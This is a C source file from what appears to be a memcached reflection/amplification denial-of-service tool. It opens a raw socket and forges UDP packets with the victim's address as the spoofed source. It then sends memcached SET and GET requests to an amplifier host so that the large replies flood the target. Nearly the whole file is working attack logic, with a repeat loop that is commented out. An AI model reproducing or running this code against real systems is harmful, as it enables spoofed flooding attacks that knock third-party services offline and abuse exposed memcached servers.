#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <signal.h>
#include "c.h"
#include "packetforge.h"
#include "memcached.h"
#include "strix.h"

volatile sig_atomic_t stop = 1;

static void sigint_handler( int signum )
{
  stop = 0;
  fprintf(stdout, "\nShutdown signal received\n");
}

/*Code inspired on t50 */
static int 
create_socket( void )
{
  int fd, flag;
  uint32_t n = 1;

  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
  {
    fatal_error("Cannot open raw socket");
  }

/* Try to change the socket mode to NON BLOCKING. */
  if ((flag = fcntl(fd, F_GETFL)) == -1)
  {
    fatal_error("Cannot get socket flags");
  }

  if (fcntl(fd, F_SETFL, flag | O_NONBLOCK) == -1)
  {
    fatal_error("Cannot set socket to non-blocking mode");
  }


  /* Setting IP_HDRINCL. */
  /* NOTE: We will provide the IP header, but enabling this option, on linux,
           still makes the kernel calculates the checksum and total_length. */
  if ( setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &n, sizeof(n)) == -1 )
  {
    fatal_error("Cannot set socket options");
  }

  return fd;
}

/* Taken from t50 */
static void 
close_socket( int fd)
{
  /* Close only if the descriptor is valid. */
  if (fd > 0)
  {
    close(fd);    // AS_SAFE!

    /* Added to avoid multiple socket closing. */
    fd = -1;
  }
}

static void 
attack( AttackData * data )
{
  struct sockaddr_in sin;
  int socket = -1;
  
  assert( data != NULL );
  
  signal(SIGINT, sigint_handler);
  
  socket = create_socket();
  sin.sin_family = AF_INET;
  sin.sin_port = htons(data->atkPlan->target_port);
  sin.sin_addr.s_addr = inet_addr(data->atkPlan->target_ip);

  //Precisamos inserir os dados no memcached antes de iniciar o ataque
  if( unlikely( sendto(socket, data->setPacket->packet_ptr, data->setPacket->size, MSG_NOSIGNAL, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) == -1 ) ){
    close_socket( socket );
    warning("Socket Error");
  }

  //do{
    if( unlikely( sendto(socket, data->getPacket->packet_ptr, data->getPacket->size, MSG_NOSIGNAL, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) == -1 ) ){
      close_socket( socket );
      warning("Scoket error"); 
    }
  //}while( likely(stop));

  close_socket( socket );
}

void 
executeAttack( AttackPlan * plan )
{
  AttackData * atkData;
  Packet * memcachedPkt;

  memalloc( (void *)&atkData, sizeof( AttackData ), __func__);
  
  atkData->atkPlan = plan;
   
  memcachedPkt = forgeMemcached(  SET );
  atkData->setPacket = forgeUDP(plan->target_ip, plan->amp_ip, plan->target_port, plan->amp_port, memcachedPkt->packet_ptr, memcachedPkt->size);

  memcachedPkt = forgeMemcached(  GET );
  atkData->getPacket = forgeUDP(plan->target_ip, plan->amp_ip, plan->target_port, plan->amp_port, memcachedPkt->packet_ptr, memcachedPkt->size);

  attack( atkData );

  release_packet( &atkData->setPacket);
  release_packet( &atkData->getPacket);
  free( atkData );
  
}



